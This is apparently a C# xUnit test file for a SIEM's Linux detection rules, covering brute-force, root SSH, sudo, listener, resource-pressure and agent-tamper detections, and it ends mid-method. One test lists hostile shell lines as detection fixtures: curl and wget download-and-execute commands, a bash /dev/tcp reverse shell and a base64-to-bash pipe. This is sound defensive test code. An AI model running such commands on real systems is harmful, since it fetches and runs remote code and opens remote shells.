using System.Diagnostics;
using System.Text.Json;
using Challenger.Siem.Api.Database;
using Challenger.Siem.Api.Detections;
using Challenger.Siem.Contracts.V1;
using Challenger.Siem.LinuxAgent.Config;
using Challenger.Siem.LinuxAgent.SelfIntegrity;
using Microsoft.Extensions.Options;
using Npgsql;
using Xunit;

namespace Challenger.Siem.Api.Tests;

[Collection(PostgresIntegrationCollection.Name)]
public sealed class LinuxDetectionTests(IntegrationTestDatabase database)
{
    [Fact]
    public void BuiltInDetectionRulesExposeRequiredVersionedOperatorMetadata()
    {
        Assert.Contains(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "auth.bruteforce.linux");
        Assert.Contains(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "tamper.agent-self-integrity.linux");
        Assert.Contains(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "process.suspicious-snapshot-command.linux");
        Assert.Contains(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "network.listener-observed.linux");
        Assert.Contains(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "behavior.host-resource-pressure.linux");

        foreach (var rule in DetectionRuleCatalog.BuiltInRules)
        {
            Assert.True(rule.Version >= 1);
            Assert.NotEmpty(rule.RuleId);
            Assert.NotEmpty(rule.Severity);
            Assert.NotEmpty(rule.Confidence);
            Assert.NotEmpty(rule.Category);
            Assert.NotEmpty(rule.Tactics);
            Assert.InRange(rule.CorrelationWindowSeconds, 60, 604800);
            Assert.NotEmpty(rule.SuppressionKeys);
            Assert.NotEmpty(rule.FalsePositiveNotes);
            Assert.NotEmpty(rule.ResponseGuidance);
        }

        var process = Assert.Single(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "process.suspicious-snapshot-command.linux");
        Assert.Equal([LinuxTelemetrySourceIds.ProcessSnapshotDiff], process.RequiredSources);
        Assert.Contains("process_command_line", process.RequiredFields);
        var listener = Assert.Single(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "network.listener-observed.linux");
        Assert.Equal([LinuxTelemetrySourceIds.NetworkSocketSnapshotDiff], listener.RequiredSources);
        Assert.Contains("polling", listener.Description, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("baseline", listener.FalsePositiveNotes, StringComparison.OrdinalIgnoreCase);
        var pressure = Assert.Single(DetectionRuleCatalog.BuiltInRules, rule => rule.RuleId == "behavior.host-resource-pressure.linux");
        Assert.Equal([LinuxTelemetrySourceIds.HostBehaviourMetrics], pressure.RequiredSources);
    }

    [Fact]
    public void LinuxRulesHavePositiveAndNegativeSyntheticStructuredFixtures()
    {
        var engine = new DetectionEngine();
        var cases = LinuxRuleCases().ToArray();
        var catalogRuleIds = DetectionRuleCatalog.BuiltInRules
            .Where(rule => DetectionRuleCatalog.IsLinuxRule(rule.RuleId))
            .Select(rule => rule.RuleId)
            .Order(StringComparer.Ordinal)
            .ToArray();
        Assert.Equal(catalogRuleIds, cases.Select(item => item.RuleId).Order(StringComparer.Ordinal).ToArray());

        foreach (var (ruleId, positive, negative, healthSource) in cases)
        {
            var health = HealthySources(healthSource);
            var positiveResult = Assert.Single(engine.EvaluateLinux(positive, health), result => result.Rule.RuleId == ruleId);
            Assert.True(positiveResult.PrerequisitesMet, positiveResult.Reason);
            Assert.True(positiveResult.Matched, positiveResult.Reason);
            Assert.NotEmpty(positiveResult.SuppressionKey);
            Assert.NotEmpty(positiveResult.MatchedFields);

            var negativeResult = Assert.Single(engine.EvaluateLinux(negative, health), result => result.Rule.RuleId == ruleId);
            Assert.True(negativeResult.PrerequisitesMet, negativeResult.Reason);
            Assert.False(negativeResult.Matched, negativeResult.Reason);
        }
    }

    [Fact]
    public void L4RolePrimaryEventsPreserveFixedSecondaryL2DetectionSemantics()
    {
        var engine = new DetectionEngine();
        var cases = new (string RuleId, string L2SourceId, EventEnvelope L2Event, EventEnvelope L4Event)[]
        {
            (
                "persistence.service-start.linux",
                LinuxTelemetrySourceIds.ServiceChange,
                LinuxJournalEvent(LinuxTelemetrySourceIds.ServiceChange, "service", "service_start", "success", serviceName: "nginx.service"),
                L4RoleCollisionEvent(
                    LinuxTelemetrySourceIds.RoleWeb, "web_service", "web_server", "service_start", "success",
                    LinuxTelemetrySourceIds.ServiceChange, "service_start", serviceName: "nginx.service")),
            (
                "auth.bruteforce.linux",
                LinuxTelemetrySourceIds.LoginSession,
                LinuxJournalEvent(
                    LinuxTelemetrySourceIds.LoginSession, "authentication", "authenticate", "failure",
                    sourceIp: "192.0.2.90", targetUser: "synthetic-user"),
                L4RoleCollisionEvent(
                    LinuxTelemetrySourceIds.RoleDatabase, "database_authentication", "database_server", "authenticate", "failure",
                    LinuxTelemetrySourceIds.LoginSession, "login", sourceIp: "192.0.2.90", targetUser: "synthetic-user")),
            (
                "auth.success-after-failures.linux",
                LinuxTelemetrySourceIds.Ssh,
                LinuxJournalEvent(
                    LinuxTelemetrySourceIds.Ssh, "authentication", "authenticate", "success",
                    sourceIp: "192.0.2.91", targetUser: "synthetic-user"),
                L4RoleCollisionEvent(
                    LinuxTelemetrySourceIds.RoleIdentity, "identity_authentication", "identity_server", "authenticate", "success",
                    LinuxTelemetrySourceIds.Ssh, "ssh_authentication", sourceIp: "192.0.2.91", targetUser: "synthetic-user")),
            (
                "ssh.root-login.linux",
                LinuxTelemetrySourceIds.Ssh,
                LinuxJournalEvent(
                    LinuxTelemetrySourceIds.Ssh, "session", "session_start", "success",
                    sourceIp: "192.0.2.92", targetUser: "root"),
                L4RoleCollisionEvent(
                    LinuxTelemetrySourceIds.RoleIdentity, "identity_authentication", "identity_server", "session_start", "success",
                    LinuxTelemetrySourceIds.Ssh, "ssh_session", sourceIp: "192.0.2.92", targetUser: "root")),
            (
                "privilege.sudo-su-root.linux",
                LinuxTelemetrySourceIds.Privilege,
                LinuxJournalEvent(
                    LinuxTelemetrySourceIds.Privilege, "authorization", "command_execute", "success",
                    targetUser: "root"),
                L4RoleCollisionEvent(
                    LinuxTelemetrySourceIds.RoleIdentity, "identity_security", "identity_server", "command_execute", "success",
                    LinuxTelemetrySourceIds.Privilege, "sudo", targetUser: "root"))
        };

        foreach (var (ruleId, l2SourceId, l2Event, l4Event) in cases)
        {
            var health = HealthySources(l2SourceId);
            var l2 = Assert.Single(engine.EvaluateLinux(l2Event, health), result => result.Rule.RuleId == ruleId);
            var l4 = Assert.Single(engine.EvaluateLinux(l4Event, health), result => result.Rule.RuleId == ruleId);
            Assert.True(l2.PrerequisitesMet, $"L2: {l2.Reason}");
            Assert.True(l2.Matched, $"L2: {l2.Reason}");
            Assert.True(l4.PrerequisitesMet, $"L4: {l4.Reason}");
            Assert.True(l4.Matched, $"L4: {l4.Reason}");
        }
    }

    [Fact]
    public void L4SecondaryEvidenceRejectsSpoofedOrMismatchedIdentities()
    {
        var engine = new DetectionEngine();
        var health = HealthySources(LinuxTelemetrySourceIds.ServiceChange);
        var valid = L4RoleCollisionEvent(
            LinuxTelemetrySourceIds.RoleWeb, "web_service", "web_server", "service_start", "success",
            LinuxTelemetrySourceIds.ServiceChange, "service_start", serviceName: "nginx.service");
        var invalid = new (string Name, EventEnvelope Event)[]
        {
            ("non-role primary source", valid with { SourceId = LinuxTelemetrySourceIds.JournalL1 }),
            ("non-journal primary kind", valid with { Source = EventSources.AgentHealth }),
            ("non-canonical platform", valid with { Platform = "LINUX" }),
            ("family from another L2 source", WithCollisionLabels(valid, "web_service", LinuxTelemetrySourceIds.ServiceChange, "login")),
            ("source paired with another L2 family", WithCollisionLabels(valid, "web_service", LinuxTelemetrySourceIds.LoginSession, "service_start")),
            ("family from another L4 role", WithCollisionLabels(valid, "database_service", LinuxTelemetrySourceIds.ServiceChange, "service_start")),
            ("case-variant secondary source", WithCollisionLabels(valid, "web_service", "LINUX-SERVICE-CHANGE", "service_start")),
            ("case-variant secondary family", WithCollisionLabels(valid, "web_service", LinuxTelemetrySourceIds.ServiceChange, "SERVICE_START")),
            ("missing secondary family", WithCollisionLabels(valid, "web_service", LinuxTelemetrySourceIds.ServiceChange, null))
        };

        foreach (var (name, candidate) in invalid)
        {
            var result = Assert.Single(engine.EvaluateLinux(candidate, health),
                item => item.Rule.RuleId == "persistence.service-start.linux");
            Assert.False(result.PrerequisitesMet, name);
            Assert.False(result.Matched, name);
        }

        var familyActionMismatch = L4RoleCollisionEvent(
            LinuxTelemetrySourceIds.RoleWeb, "web_service", "web_server", "service_failure", "failure",
            LinuxTelemetrySourceIds.ServiceChange, "service_start", serviceName: "nginx.service");
        var mismatch = Assert.Single(engine.EvaluateLinux(familyActionMismatch, health),
            item => item.Rule.RuleId == "persistence.service-start.linux");
        Assert.True(mismatch.PrerequisitesMet, mismatch.Reason);
        Assert.False(mismatch.Matched, mismatch.Reason);

        var sshFamilyActionMismatch = L4RoleCollisionEvent(
            LinuxTelemetrySourceIds.RoleIdentity, "identity_authentication", "identity_server", "authenticate", "success",
            LinuxTelemetrySourceIds.Ssh, "ssh_session", sourceIp: "192.0.2.93", targetUser: "root");
        var sshMismatch = Assert.Single(engine.EvaluateLinux(
                sshFamilyActionMismatch,
                HealthySources(LinuxTelemetrySourceIds.Ssh)),
            item => item.Rule.RuleId == "ssh.root-login.linux");
        Assert.True(sshMismatch.PrerequisitesMet, sshMismatch.Reason);
        Assert.False(sshMismatch.Matched, sshMismatch.Reason);
    }

    [Fact]
    public void PassiveProcessDetectionUsesStructuredCommandsAndConservativeActionsOnly()
    {
        var engine = new DetectionEngine();
        var health = HealthySources(LinuxTelemetrySourceIds.ProcessSnapshotDiff);
        var positives = new[]
        {
            "/usr/bin/curl https://example.invalid/synthetic.sh | /bin/sh",
            "/bin/bash -i >& /dev/tcp/192.0.2.25/4444 0>&1",
            "/usr/bin/printf c3ludGhldGlj | /usr/bin/base64 --decode | /bin/bash",
            "/usr/bin/wget https://example.invalid/synthetic -O /tmp/synthetic && chmod +x /tmp/synthetic && /tmp/synthetic"
        };
        for (var index = 0; index < positives.Length; index++)
        {
            var action = index == positives.Length - 1 ? "changed" : "observed";
            var result = PassiveRuleResult(engine, PassiveProcessEvent(action, positives[index]), health, "process.suspicious-snapshot-command.linux");
            Assert.True(result.Matched, positives[index]);
        }

        var benign = PassiveRuleResult(
            engine,
            PassiveProcessEvent("observed", "/usr/bin/curl https://example.invalid/synthetic.tar -o /tmp/synthetic.tar"),
            health,
            "process.suspicious-snapshot-command.linux");
        Assert.False(benign.Matched);

        var messageOnly = PassiveProcessEvent("observed", "/usr/bin/id --synthetic") with
        {
            Message = "/usr/bin/curl https://example.invalid/synthetic.sh | /bin/sh"
        };
        Assert.False(PassiveRuleResult(engine, messageOnly, health, "process.suspicious-snapshot-command.linux").Matched);
        Assert.False(PassiveRuleResult(
            engine,
            PassiveProcessEvent("disappeared", positives[0]),
            health,
            "process.suspicious-snapshot-command.linux").Matched);
        Assert.False(PassiveRuleResult(
            engine,
            PassiveProcessEvent("baseline", positives[0]),
            health,
            "process.suspicious-snapshot-command.linux").Matched);
    }

    [Fact]
    public void PassiveDetectionConfidenceDoesNotRequireEveryRareLifecycleFamilyToHaveOccurred()
    {
        var engine = new DetectionEngine();
        var sourceId = LinuxTelemetrySourceIds.ProcessSnapshotDiff;
        var health = new Dictionary<string, SourceHealthReport>(StringComparer.OrdinalIgnoreCase)
        {
            [sourceId] = new SourceHealthReport
            {
                SourceId = sourceId,
                Status = SourceHealthStatuses.Healthy,
                PrerequisiteStatuses = new Dictionary<string, string>(StringComparer.Ordinal)
                {
                    ["explicit_passive_telemetry_opt_in"] = SourceEvidenceStatuses.Satisfied,
                    ["approval_hash_matches"] = SourceEvidenceStatuses.Satisfied,
                    ["procfs_process_metadata_readable"] = SourceEvidenceStatuses.Satisfied
                },
                EventFamilyStatuses = new Dictionary<string, string>(StringComparer.Ordinal)
                {
                    ["baseline"] = SourceEvidenceStatuses.Observed,
                    ["observed"] = SourceEvidenceStatuses.Observed,
                    ["changed"] = SourceEvidenceStatuses.NotObserved,
                    ["disappeared"] = SourceEvidenceStatuses.NotObserved,
                    ["baseline_disappeared"] = SourceEvidenceStatuses.NotObserved
                },
                DroppedEvents = 2,
                Details = new Dictionary<string, string>(StringComparer.Ordinal)
            }
        };

        var result = PassiveRuleResult(
            engine,
            PassiveProcessEvent("observed", "/usr/bin/curl https://example.invalid/synthetic.sh | /bin/sh"),
            health,
            "process.suspicious-snapshot-command.linux");

        Assert.True(result.PrerequisitesMet, result.Reason);
        Assert.True(result.Matched, result.Reason);
        Assert.Equal("medium", result.EffectiveConfidence);
        Assert.Equal("structured Linux event matched rule predicate", result.Reason);

        health[sourceId] = health[sourceId] with
        {
            EventFamilyStatuses = new Dictionary<string, string>(health[sourceId].EventFamilyStatuses!, StringComparer.Ordinal)
            {
                ["observed"] = SourceEvidenceStatuses.Degraded
            }
        };
        var degraded = PassiveRuleResult(
            engine,
            PassiveProcessEvent("observed", "/usr/bin/curl https://example.invalid/synthetic.sh | /bin/sh"),
            health,
            "process.suspicious-snapshot-command.linux");
        Assert.Equal("low", degraded.EffectiveConfidence);

        health[sourceId] = health[sourceId] with
        {
            EventFamilyStatuses = new Dictionary<string, string>(StringComparer.Ordinal)
            {
                ["observed"] = SourceEvidenceStatuses.Observed
            },
            GapDetected = true
        };
        var activeGap = PassiveRuleResult(
            engine,
            PassiveProcessEvent("observed", "/usr/bin/curl https://example.invalid/synthetic.sh | /bin/sh"),
            health,
            "process.suspicious-snapshot-command.linux");
        Assert.Equal("low", activeGap.EffectiveConfidence);
    }

    [Fact]
    public void PassiveListenerDetectionRequiresNonLoopbackAddressValidPortAndPollingActions()
    {
        var engine = new DetectionEngine();
        var health = HealthySources(LinuxTelemetrySourceIds.NetworkSocketSnapshotDiff);
        foreach (var item in new[]
        {
            PassiveListenerEvent("0.0.0.0", "8443", "observed"),
            PassiveListenerEvent("::", "8443", "changed"),
            PassiveListenerEvent("192.0.2.40", "8443", "observed")
        })
        {
            Assert.True(PassiveRuleResult(engine, item, health, "network.listener-observed.linux").Matched);
        }

        foreach (var item in new[]
        {
            PassiveListenerEvent("127.0.0.1", "8443", "observed"),
            PassiveListenerEvent("::1", "8443", "observed"),
            PassiveListenerEvent("192.0.2.40", "0", "observed"),
            PassiveListenerEvent("192.0.2.40", "65536", "observed"),
            PassiveListenerEvent("192.0.2.40", "not-a-port", "observed"),
            PassiveListenerEvent("192.0.2.40", "8443", "disappeared"),
            PassiveListenerEvent("192.0.2.40", "8443", "baseline"),
            PassiveListenerEvent("192.0.2.40", "8443", "observed", "network")
        })
        {
            Assert.False(PassiveRuleResult(engine, item, health, "network.listener-observed.linux").Matched);
        }
    }

    [Fact]
    public void PassiveHostPressureDetectionUsesBoundedRawNumbersAndRejectsMalformedValues()
    {
        var engine = new DetectionEngine();
        var health = HealthySources(LinuxTelemetrySourceIds.HostBehaviourMetrics);
        var positives = new[]
        {
            HostMetricsEvent(new { cpu_busy_permille = 950 }),
            HostMetricsEvent(new { memory_total_bytes = 1_000L, memory_available_bytes = 50L }),
            HostMetricsEvent(new { processes_blocked = 8L }),
            HostMetricsEvent(new { cpu_pressure_some_avg10_milli = 50_000L }),
            HostMetricsEvent(new { memory_pressure_some_avg10_milli = 50_000L }),
            HostMetricsEvent(new { io_pressure_some_avg10_milli = 50_000L })
        };
        foreach (var item in positives)
        {
            Assert.True(PassiveRuleResult(engine, item, health, "behavior.host-resource-pressure.linux").Matched);
        }

        var partial = HostMetricsEvent(new { cpu_busy_permille = 950 }) with
        {
            Normalized = new NormalizedEventFields
            {
                Category = "host_behavior",
                Action = "sampled",
                Outcome = "unknown",
                Labels = new Dictionary<string, string>(StringComparer.Ordinal)
                {
                    ["evidence_mode"] = "coalesced_procfs_sample",
                    ["metrics.completeness"] = "partial"
                }
            }
        };
        var partialResult = PassiveRuleResult(engine, partial, health, "behavior.host-resource-pressure.linux");
        Assert.True(partialResult.Matched);
        Assert.Equal("low", partialResult.EffectiveConfidence);
        Assert.Contains("partial host-metrics evidence", partialResult.Reason, StringComparison.OrdinalIgnoreCase);

        var belowThreshold = HostMetricsEvent(new
        {
            cpu_busy_permille = 949,
            memory_total_bytes = 1_000L,
            memory_available_bytes = 51L,
            processes_blocked = 7L,
            cpu_pressure_some_avg10_milli = 49_999L,
            memory_pressure_some_avg10_milli = 49_999L,
            io_pressure_some_avg10_milli = 49_999L
        });
        Assert.False(PassiveRuleResult(engine, belowThreshold, health, "behavior.host-resource-pressure.linux").Matched);

        var malformed = new[]
        {
            HostMetricsEvent(new { }),
            HostMetricsEvent(new { cpu_busy_permille = "950" }),
            HostMetricsEvent(new { cpu_busy_permille = 1_001 }),
            HostMetricsEvent(new { memory_total_bytes = 0L, memory_available_bytes = 0L }),
            HostMetricsEvent(new { processes_blocked = -1L }),
            HostMetricsEvent(new { io_pressure_some_avg10_milli = 100_001L }),
            HostMetricsEvent(new { cpu_busy_permille = 950.5m }),
            HostMetricsEvent(new[] { 950 }),
            HostMetricsEvent(new { cpu_busy_permille = 950 }, "observed"),
            HostMetricsEvent(new { cpu_busy_permille = 950 }) with { Raw = default }
        };
        foreach (var item in malformed)
        {
            Assert.False(PassiveRuleResult(engine, item, health, "behavior.host-resource-pressure.linux").Matched);
        }
    }

    [Fact]
    public async Task LinuxSelfIntegrityDetectionMatchesCollectorMaterialChangesOnly()
    {
        if (!OperatingSystem.IsLinux()) return;
        var root = await CreateSelfIntegrityRootAsync();
        try
        {
            var options = new LinuxAgentOptions
            {
                AgentId = "agent-1",
                ServerBaseUrl = new Uri("https://siem.synthetic"),
                ApiToken = "synthetic-token",
                SelfIntegrity = new SelfIntegrityOptions
                {
                    Enabled = true,
                    IntervalSeconds = 300,
                    ScanTimeoutSeconds = 5,
                    QueuePauseDepth = 100,
                    MaxEventsPerScan = 20,
                    StatePath = Path.Combine(root, "var/lib/challenger-siem-agent/self-integrity-state.json")
                }
            };
            options.SelfIntegrity.ApprovedPlanHash = LinuxSelfIntegrityCollector.ComputePlanHash(options.SelfIntegrity);
            var collector = new LinuxSelfIntegrityCollector(Options.Create(options), new LinuxSelfIntegritySource(root), TimeProvider.System);
            var first = await collector.CollectAsync(new LinuxSelfIntegrityState(), "agent-1", "SYNTHETIC-LINUX-01", default);
            var state = new LinuxSelfIntegrityState { Signatures = first.NewSignatures, NextSequence = first.NextSequence };
            await File.AppendAllTextAsync(Path.Combine(root, "opt/challenger-siem-agent/Challenger.Siem.LinuxAgent"), "synthetic-change");

            var second = await collector.CollectAsync(state, "agent-1", "SYNTHETIC-LINUX-01", default);
            var changed = Assert.Single(second.Events, item => item.State == LinuxSelfIntegrityStates.Changed).Envelope;
            var sample = Assert.Single(second.Events, item => item.State == LinuxSelfIntegrityStates.Sample).Envelope;
            var engine = new DetectionEngine();
            var health = HealthySources(LinuxTelemetrySourceIds.AgentSelfIntegrity);

            var changedResult = Assert.Single(engine.EvaluateLinux(changed, health), result => result.Rule.RuleId == "tamper.agent-self-integrity.linux");
            Assert.True(changedResult.Matched, changedResult.Reason);
            Assert.Equal(changed.EventId, second.Events.Single(item => item.State == LinuxSelfIntegrityStates.Changed).Envelope.EventId);
            Assert.Contains("event_code", changedResult.MatchedFields);

            var sampleResult = Assert.Single(engine.EvaluateLinux(sample, health), result => result.Rule.RuleId == "tamper.agent-self-integrity.linux");
            Assert.False(sampleResult.Matched, sampleResult.Reason);
        }
        finally { Directory.Delete(root, true); }
    }

    [Fact]
    public void LinuxDetectionPrerequisiteDegradationSuppressesOrLowersConfidenceExplicitly()
    {
        var engine = new DetectionEngine();
        var eventEnvelope = LinuxJournalEvent(
            LinuxTelemetrySourceIds.Privilege,
            "authorization",
            "command_execute",
            "success",
            normalized: new NormalizedEventFields
            {
                Category = "authorization",
                Action = "command_execute",
                Outcome = "success",
                UserName = "synthetic-user",
                TargetUserName = "root",
                ProcessCommandLine = "/usr/bin/id --synthetic",
                Process = new ProcessTelemetryConcept { CommandLine = "/usr/bin/id --synthetic" }
            });

        var missing = Assert.Single(engine.EvaluateLinux(eventEnvelope, new Dictionary<string, SourceHealthReport>(StringComparer.OrdinalIgnoreCase)),
            result => result.Rule.RuleId == "privilege.sudo-su-root.linux");
        Assert.True(missing.PrerequisitesMet);
        Assert.True(missing.Matched);
        Assert.Equal("low", missing.EffectiveConfidence);
        Assert.Contains("source-health row is missing", missing.Reason, StringComparison.OrdinalIgnoreCase);

        var denied = Assert.Single(engine.EvaluateLinux(eventEnvelope,
                HealthySources(LinuxTelemetrySourceIds.Privilege, SourceHealthStatuses.PermissionDenied)),
            result => result.Rule.RuleId == "privilege.sudo-su-root.linux");
        Assert.True(denied.PrerequisitesMet);
        Assert.True(denied.Matched);
        Assert.Equal("low", denied.EffectiveConfidence);
        Assert.Contains("matching event retained", denied.Reason, StringComparison.OrdinalIgnoreCase);

        var activeGap = HealthySources(LinuxTelemetrySourceIds.Privilege, SourceHealthStatuses.Error)
            .ToDictionary(item => item.Key, item => item.Value with { GapDetected = true }, StringComparer.OrdinalIgnoreCase);
        var gapResult = Assert.Single(engine.EvaluateLinux(eventEnvelope, activeGap),
            result => result.Rule.RuleId == "privilege.sudo-su-root.linux");
        Assert.True(gapResult.PrerequisitesMet);
        Assert.True(gapResult.Matched);
        Assert.Equal("low", gapResult.EffectiveConfidence);
        Assert.Contains("matching event retained", gapResult.Reason, StringComparison.OrdinalIgnoreCase);

        var degraded = Assert.Single(engine.EvaluateLinux(eventEnvelope,
                HealthySources(LinuxTelemetrySourceIds.Privilege, SourceHealthStatuses.Degraded)),
            result => result.Rule.RuleId == "privilege.sudo-su-root.linux");
        Assert.True(degraded.PrerequisitesMet);
        Assert.True(degraded.Matched);
        Assert.Equal("low", degraded.EffectiveConfidence);
        Assert.Contains("confidence lowered", degraded.Reason, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void LinuxRuleExecutionRemainsBoundedForRepresentativeVolume()
    {
        var engine = new DetectionEngine();
        var health = HealthySources(LinuxTelemetrySourceIds.Ssh);
        var events = Enumerable.Range(0, 5000)
            .Select(index => LinuxJournalEvent(
                LinuxTelemetrySourceIds.Ssh,
                "authentication",
                "authenticate",
                index % 2 == 0 ? "failure" : "success",
                sourceIp: "192.0.2.10",
                targetUser: "synthetic-user"))
            .ToArray();

        var stopwatch = Stopwatch.StartNew();
        var matches = 0;
        foreach (var item in events)
        {
            matches += engine.EvaluateLinux(item, health).Count(result => result.Matched);
        }
        stopwatch.Stop();

        Assert.True(matches > 0);
        Assert.True(stopwatch.Elapsed < TimeSpan.FromSeconds(10), $"Linux detection benchmark exceeded bound: {stopwatch.Elapsed}");
    }

    [Fact]
    public void LinuxDetectionMigrationAndSchemaValidationKnowAdditiveMetadata()
    {
        var migration = File.ReadAllText(RepositoryFile("server", "Siem.Api", "Database", "008_linux_detection_execution.sql"));
        var validator = File.ReadAllText(RepositoryFile("scripts", "validate-schema.sh"));
        foreach (var fragment in new[]
        {
            "detection_rules add column if not exists tactics",
            "correlation_window_seconds",
            "suppression_keys",
            "uq_alert_evidence_alert_agent_event",
            "idx_events_linux_auth_correlation"
        })
        {
            Assert.Contains(fragment, migration, StringComparison.OrdinalIgnoreCase);
        }
        foreach (var fragment in new[]
        {
            "detection_rules', 'tactics",
            "correlation_window_seconds",
            "suppression_keys",
            "uq_alert_evidence_alert_agent_event",
            "idx_events_linux_auth_correlation"
        })
        {
            Assert.Contains(fragment, validator, StringComparison.OrdinalIgnoreCase);
        }
        Assert.DoesNotContain("drop table", migration, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("drop column", migration, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("truncate ", migration, StringComparison.OrdinalIgnoreCase);
    }

    [PostgresFact]
    public async Task LinuxDetectionsPersistRuleVersionEvidenceAndSuppressDuplicates()
    {
        var connectionString = database.RequireConnectionString();
        await using var dataSource = NpgsqlDataSource.Create(connectionString);
        var agentId = $"linux-detect-{Guid.NewGuid():N}";
        var hostname = "SYNTHETIC-LINUX-DETECT";
        await InsertLinuxAgentAsync(dataSource, agentId, hostname);
        await StoreHealthyHeartbeatAsync(dataSource, agentId, hostname, LinuxTelemetrySourceIds.Ssh);
        await EnableDetectionRuleAsync(dataSource, "auth.bruteforce.linux", 1);

        var now = DateTimeOffset.FromUnixTimeSeconds((DateTimeOffset.UtcNow.ToUnixTimeSeconds() / 900 * 900) + 450);
        var events = Enumerable.Range(0, 5)
            .Select(index => LinuxJournalEvent(
                LinuxTelemetrySourceIds.Ssh,
                "authentication",
                "authenticate",
                "failure",
                now.AddMinutes(-index),
                sourceIp: "192.0.2.10",
                targetUser: "synthetic-user") with
            {
                AgentId = agentId,
                Hostname = hostname
            })
            .ToArray();
        var batch = new IngestBatchRequest { AgentId = agentId, BatchId = Guid.NewGuid(), SentAt = now, Events = events };
        var eventRepository = new EventRepository(dataSource);
        var alertRepository = new AlertRepository(dataSource);
        var storeResult = await eventRepository.StoreEventsAsync(batch, CancellationToken.None);
        // Simulate a process failure after the event transaction committed but before
        // detection ran. The duplicate retry must recover by evaluating stored rows.
        Assert.Equal(events.Length, storeResult.Accepted);

        var duplicateStore = await eventRepository.StoreEventsAsync(batch, CancellationToken.None);
        Assert.Equal(events.Length, duplicateStore.Duplicates);
        var recovered = await eventRepository.LoadStoredEventsAsync(
            agentId,
            duplicateStore.AcceptedEventIds.Concat(duplicateStore.DuplicateEventIds),
            CancellationToken.None);
        await alertRepository.RunLinuxDetectionsAsync(recovered, new DetectionEngine(), CancellationToken.None);

        // Re-evaluation is idempotent for both alert identity and evidence identity.
        await alertRepository.RunLinuxDetectionsAsync(recovered, new DetectionEngine(), CancellationToken.None);

        await using var countCommand = dataSource.CreateCommand("""
            select count(*)::int
            from alerts
            where agent_id = @agent_id and rule_id = 'auth.bruteforce.linux';
            """);
        countCommand.Parameters.AddWithValue("agent_id", agentId);
        Assert.Equal(1, Convert.ToInt32(await countCommand.ExecuteScalarAsync()));

        await using var evidenceCommand = dataSource.CreateCommand("""
            select a.rule_version, count(ae.event_id)::int, count(distinct ae.event_id)::int
            from alerts a
            join alert_evidence ae on ae.alert_id = a.alert_id
            where a.agent_id = @agent_id and a.rule_id = 'auth.bruteforce.linux'
            group by a.rule_version;
            """);
        evidenceCommand.Parameters.AddWithValue("agent_id", agentId);
        await using var reader = await evidenceCommand.ExecuteReaderAsync();
        Assert.True(await reader.ReadAsync());
        Assert.Equal(1, reader.GetInt32(0));
        Assert.Equal(5, reader.GetInt32(1));
        Assert.Equal(5, reader.GetInt32(2));
        Assert.False(await reader.ReadAsync());
    }

    [PostgresFact]
    public async Task CoalescedLinuxDetectionEvidenceIsTransactionallyBounded()
    {
        var connectionString = database.RequireConnectionString();
        await using var dataSource = NpgsqlDataSource.Create(connectionString);
        var agentId = $"linux-evidence-cap-{Guid.NewGuid():N}";
        const string hostname = "SYNTHETIC-LINUX-EVIDENCE-CAP";
        await InsertLinuxAgentAsync(dataSource, agentId, hostname);
        await StoreHealthyHeartbeatAsync(dataSource, agentId, hostname, LinuxTelemetrySourceIds.HostBehaviourMetrics);
        await EnableDetectionRuleAsync(dataSource, "behavior.host-resource-pressure.linux", 1);

        var now = DateTimeOffset.FromUnixTimeSeconds((DateTimeOffset.UtcNow.ToUnixTimeSeconds() / 900 * 900) + 450);
        var events = Enumerable.Range(0, AlertRepository.MaxEvidencePerAlert + 5)
            .Select(index =>
            {
                var item = HostMetricsEvent(new { cpu_busy_permille = 950 });
                if (index == 0)
                {
                    item = item with
                    {
                        Normalized = item.Normalized! with
                        {
                            Outcome = "unknown",
                            Labels = new Dictionary<string, string>(item.Normalized.Labels, StringComparer.Ordinal)
                            {
                                ["metrics.completeness"] = "partial"
                            }
                        }
                    };
                }
                return item with
                {
                    AgentId = agentId,
                    Hostname = hostname,
                    EventId = Guid.NewGuid(),
                    EventTime = now.AddSeconds(index)
                };
            })
            .ToArray();
        var eventRepository = new EventRepository(dataSource);
        var stored = await eventRepository.StoreEventsAsync(new IngestBatchRequest
        {
            AgentId = agentId,
            BatchId = Guid.NewGuid(),
            SentAt = now,
            Events = events
        }, CancellationToken.None);
        var canonical = await eventRepository.LoadStoredEventsAsync(agentId, stored.AcceptedEventIds, CancellationToken.None);
        var alertRepository = new AlertRepository(dataSource);
        await alertRepository.RunLinuxDetectionsAsync(canonical, new DetectionEngine(), CancellationToken.None);

        await using var alertCommand = dataSource.CreateCommand("""
            select alert_id
            from alerts
            where agent_id = @agent_id and rule_id = 'behavior.host-resource-pressure.linux'
            limit 1;
            """);
        alertCommand.Parameters.AddWithValue("agent_id", agentId);
        var alertId = Assert.IsType<Guid>(await alertCommand.ExecuteScalarAsync());
        var alert = await alertRepository.GetAlertAsync(alertId, CancellationToken.None);
        Assert.NotNull(alert);
        Assert.Equal(AlertRepository.MaxEvidencePerAlert, alert.Evidence.Count);
        Assert.Equal(AlertRepository.MaxEvidencePerAlert, alert.EvidenceTotal);
        Assert.Equal(AlertRepository.MaxEvidencePerAlert, alert.EvidenceReturned);
        Assert.False(alert.EvidenceTruncated);
        Assert.Equal(AlertRepository.MaxEvidencePerAlert, alert.EvidenceLimit);
        Assert.Equal("low", alert.Confidence);
        Assert.Contains($"evidence_events_retained={AlertRepository.MaxEvidencePerAlert}", alert.Summary, StringComparison.Ordinal);
        Assert.Contains("lowest coalesced evaluation", alert.Summary, StringComparison.OrdinalIgnoreCase);
    }

    private static IEnumerable<(string RuleId, EventEnvelope Positive, EventEnvelope Negative, string HealthSource)> LinuxRuleCases()
    {
        yield return ("auth.bruteforce.linux",
            LinuxJournalEvent(LinuxTelemetrySourceIds.Ssh, "authentication", "authenticate", "failure", sourceIp: "192.0.2.10", targetUser: "synthetic-user"),
